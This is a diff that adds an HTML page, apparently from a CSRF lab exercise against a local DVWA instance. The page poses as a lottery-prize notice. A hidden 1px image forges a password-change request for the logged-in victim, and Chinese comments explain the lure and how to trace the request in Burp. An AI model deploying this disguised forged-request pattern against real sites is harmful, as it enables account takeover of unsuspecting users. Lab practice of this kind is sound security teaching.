@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="utf-8">
+  <title>恭喜中奖！</title>
+</head>
+<body>
+  <h1>🎉 恭喜你获得一等奖</h1>
+  <p>正在为你领取奖品，请稍候……</p>
+
+  <!-- ================================================================
+       ★ 下面这一行才是真正干活的东西。
+       浏览器为了"加载这张图片"，会【替已登录的受害者】发出那个 GET 请求。
+       页面上其他字都是伪装，随便写。
+
+       把 src="" 里填成你在第 1 步抓到的那个改密码 URL（参数名你验证过）：
+           http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=___&password_conf=___&Change=Change
+       两个 ___ 填【同一个】值（服务器会检查它们一致）。
+
+       图片会显示成破图 —— 那是正常的（服务器返回的是 HTML，不是图片）。
+       攻击者本来就不关心响应是什么。
+       ================================================================ -->
+  <!-- ★ 密码值故意用一个【独特的串】：pwned_by_csrf
+       这样你在 Burp 里搜 pwned_by_csrf，结果【只会有一条】—— 就是攻击那一发。
+       （history 会攒很多天，搜通用词会搜出一堆旧的） -->
+  <img src="http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=pwned_by_csrf&password_conf=pwned_by_csrf&Change=Change"
+       alt="" style="width:1px;height:1px;">
+
+</body>
+</html>
